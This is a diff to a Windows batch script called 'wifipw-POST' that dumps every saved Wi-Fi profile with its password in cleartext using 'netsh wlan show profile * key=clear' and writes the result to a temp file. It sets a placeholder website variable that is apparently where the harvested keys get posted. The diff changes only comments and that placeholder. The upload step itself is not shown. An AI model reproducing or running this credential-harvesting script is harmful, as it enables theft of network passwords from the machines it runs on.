@@ -1,10 +1,10 @@
 @echo off && color a && cls && TITLE wifipw-POSTv1.0 by Whiteavocado and reveloperboy
 netsh wlan show profile * key=clear>>%tmp%\wifi.url
-::vars: website url and echo off or on.
-set "website=HTTPS://WEBSITE.COM"
+::vars:
+set "website=http://website.com"
 set "echoquestion=off"
 ::
-::
+::insert your own code here if you want.
 ::
 if %echoquestion% == off goto off
 if %echoquestion% == on goto on
